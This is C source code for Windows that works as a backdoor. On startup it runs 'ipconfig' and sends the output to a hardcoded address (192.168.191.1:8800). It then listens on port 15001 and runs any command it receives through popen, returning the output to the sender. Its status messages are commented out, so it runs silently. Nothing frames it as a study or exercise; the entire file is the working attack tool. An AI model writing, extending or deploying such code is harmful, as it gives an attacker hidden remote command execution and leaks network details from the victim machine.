#include <stdio.h>
#include <winsock2.h>
#define PORT 15001
#define ERROR 0
#define IP "192.168.191.1"
#define BUFFER_SIZE 40960
#include <windows.h>
#include <string.h>
void Send()
{
    SOCKET sock2;
    SOCKADDR_IN ClientAddr;
    WSADATA WSAData;

    if(WSAStartup(MAKEWORD(2,2),&WSAData)==SOCKET_ERROR)
    {
        //printf("Socket initialize fail!\n");
        exit(1);
    }
    if((sock2=socket(AF_INET,SOCK_STREAM,0))==SOCKET_ERROR)
    {
      //printf("Socket create fail!\n");
      closesocket(sock2);
      WSACleanup();
      //system("pause");
      exit(1);
    }
    ClientAddr.sin_family=AF_INET;
    ClientAddr.sin_port=htons(8800);
    ClientAddr.sin_addr.s_addr=inet_addr(IP);
    if(connect(sock2,(LPSOCKADDR)&ClientAddr,sizeof(ClientAddr))==SOCKET_ERROR)
    {
      //printf("Connect fail!\n");
      closesocket(sock2);
      WSACleanup();
      //system("pause");
      exit(1);
    }

    FILE *pf=popen("ipconfig","r");
    char bf[BUFFER_SIZE];
    char bf2[BUFFER_SIZE];
    int j=0;
    while(fgets(bf,BUFFER_SIZE,pf)!=NULL)
    {
        int i=0;
        while(bf[i]!='\0')
        {
            bf2[j]=bf[i];
            i++;
            j++;
        }
        //printf("%s\n",bf);
    }
    //bf2[j]='\0';
    pclose(pf);
    send(sock2,bf2,BUFFER_SIZE,0);
    /*int Left=BUFFER_SIZE;
    int Size=0;

    while(Left>0)
    {

        Size=Size+Ret;
        Left=Left-Ret;
    }*/

    closesocket(sock2);
    WSACleanup();
}
int main()
{
  WSADATA WSAData;
  SOCKET sock;
  SOCKADDR_IN ServerAddr;
  SOCKET msgsock;
  Send();
  if(WSAStartup(MAKEWORD(2,2),&WSAData)==SOCKET_ERROR)
  {
    //printf("Socket initialize fail!\n");
    //system("pause");
    exit(1);
  }

  if((sock=socket(AF_INET,SOCK_STREAM,0))==ERROR)
  {
    //printf("Socket create fail!\n");
    //system("pause");
    WSACleanup();
    exit(1);
  }
  ServerAddr.sin_family=AF_INET;
  ServerAddr.sin_port=htons(PORT);
  ServerAddr.sin_addr.s_addr=INADDR_ANY;
  if(bind(sock,(LPSOCKADDR)&ServerAddr,sizeof(ServerAddr))==SOCKET_ERROR)
  {
    //printf("Bind fail!\n");
    closesocket(sock);
    WSACleanup();
    //system("pause");
    exit(1);
  }
  //printf("Server Socket Port:%d\n",ntohs(ServerAddr.sin_port));
  if(listen(sock,10)==SOCKET_ERROR)
  {
    //printf("Listen fail!\n");
    closesocket(sock);
    WSACleanup();
    exit(1);
  }
  char buf[BUFFER_SIZE];
  char bf[BUFFER_SIZE];
  while(1)
  {
    if((msgsock=accept(sock,(LPSOCKADDR)0,(int *)0))==INVALID_SOCKET)
    {
      printf("Accept fail!\n");
      exit(1);
    }
    memset(buf,0,sizeof(buf));
    recv(msgsock,buf,BUFFER_SIZE,0);
    //printf("%s\n",buf);
    if(buf[0]=='e' && buf[1]=='x' && buf[2]=='i' && buf[3]=='t')
    {
      //printf("The End.\n");
      closesocket(sock);
      closesocket(msgsock);
      WSACleanup();
      exit(1);
    }
    //printf("C:\\Socket\\Server>%s",buf);
    memset(bf,0,sizeof(bf));
    FILE *pf=popen(buf,"r");
    char bf2[BUFFER_SIZE];
    memset(bf2,0,sizeof(bf2));
    int j=0;
    while(fgets(bf,BUFFER_SIZE,pf)!=NULL)
    {
        int i=0;
        while(bf[i]!='\0')
        {
            bf2[j]=bf[i];
            i++;
            j++;
        }

    }
    pclose(pf);
    //printf("%s\n",bf2);
    //bf2[j]='\0';
    int Ret;

    Ret=send(msgsock,bf2,BUFFER_SIZE,0);
    if(Ret==SOCKET_ERROR)
    {
        //printf("send error/n");
        //system("pause");
        exit(1);
    }
    closesocket(msgsock);
  }

  closesocket(sock);
  WSACleanup();
  return 0;
}
